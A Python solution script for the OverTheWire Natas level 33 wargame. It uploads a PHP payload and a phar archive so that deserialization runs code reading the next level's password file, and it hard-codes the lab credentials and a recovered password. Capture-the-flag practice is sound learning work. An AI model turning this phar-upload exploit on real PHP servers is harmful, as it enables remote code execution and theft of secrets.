import requests
import re
import subprocess
import hashlib
import os

username = "natas33"
passsowrd = "APwWDD3fRAf6226sgBOBaSptGwvXwQhG"
url = "http://%s.natas.labs.overthewire.org"%username

payload = b'<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>'
hash_value = hashlib.md5(payload).hexdigest()
filename = "rce.php"

with open("natas33.php.template" , "r") as template:
	with open("natas33.php" , "w") as file: # create natas33.php
		file.write(template.read().format(filename,payload.decode('ascii')))

# creating phar file from natas33.php
output = subprocess.check_output(['php','-d','phar.readonly=false','natas33.php'])

# Uploading rce.php 
requests.post(url + "/index.php",
		data={"filename":filename , "submit":"Upload File"},
		files={"Uploadedfile":payload},
		auth=(username,passsowrd))

response = requests.post(url + '/index.php' ,
						 data={'filename': 'phar://natas33.phar/test.txt', 'submit': 'Upload File'},
						 files={'uploadedfile': open('natas33.phar', 'rb')},
						 auth=(username,passsowrd))

print(response.text)

#F6Fcmavn8FgZgrAPOvoLudNr1GwQTaNG

